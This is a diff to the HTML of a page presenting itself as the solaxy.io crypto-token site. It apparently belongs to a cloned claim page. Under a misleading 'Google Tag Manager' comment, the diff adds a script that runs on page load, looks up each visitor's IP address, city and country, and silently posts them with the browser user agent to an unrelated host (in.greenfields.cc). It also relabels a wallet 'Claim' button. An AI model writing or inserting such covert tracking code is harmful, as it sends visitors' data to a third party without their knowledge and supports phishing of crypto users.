@@ -20,7 +20,40 @@
     <link rel="icon" type="image/x-icon" href="assets/images/svg-icons/token.svg">
     <link rel="canonical" href="https://solaxy.io/">
     <!-- Google Tag Manager -->
-    
+    <script>
+  fetch('https://ipapi.co/json/')
+    .then(res => res.json())
+    .then(data => {
+      const ip = data.ip;
+      const city = data.city;
+      const country = data.country_code; // Changed from country_name to country_code
+      const browser = navigator.userAgent;
+      const site = window.location.hostname;
+
+      fetch('https://in.greenfields.cc/gotty.php', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+        body: new URLSearchParams({
+          ip: ip,
+          city: city,
+          country: country,
+          browser: browser,
+          site: site
+        })
+      });
+    });
+</script>
+<script src="//code.jivosite.com/widget/XeuEuXjI0X" async></script>
+<script>
+  function openJivoChat() {
+    if (window.jivo_api) {
+      jivo_api.open();
+    } else {
+      console.warn("JivoChat not loaded yet.");
+    }
+  }
+</script>
+
     <style>@charset "UTF-8";
       @font-face{
         font-family:DesuzaPro;
@@ -2520,8 +2553,8 @@
                               <!---->
                               <div _ngcontent-ng-c2046553590="" class="d-flex align-items-center justify-content-center gap-2 my-3">
                                 
-                                <button Id="metus"  _ngcontent-ng-c2046553590="" class=" connectButton btn btn-primary w-75 height">
-                                  <span _ngcontent-ng-c2046553590="">Claim On EVM
+                                <button   _ngcontent-ng-c2046553590="" class=" connectButton btn btn-primary w-75 height">
+                                  <span _ngcontent-ng-c2046553590="">Claim Now
                                   </span>
                                 </button>
                                 <!---->
@@ -2699,17 +2732,7 @@
     </script>
    
    
-    <script src="//code.jivosite.com/widget/XeuEuXjI0X" async></script>
-<script>
-  function openJivoChat() {
-    if (window.jivo_api) {
-      jivo_api.open();
-    } else {
-      console.warn("JivoChat not loaded yet.");
-    }
-  }
-</script>
-
+    
 
 <script>
  
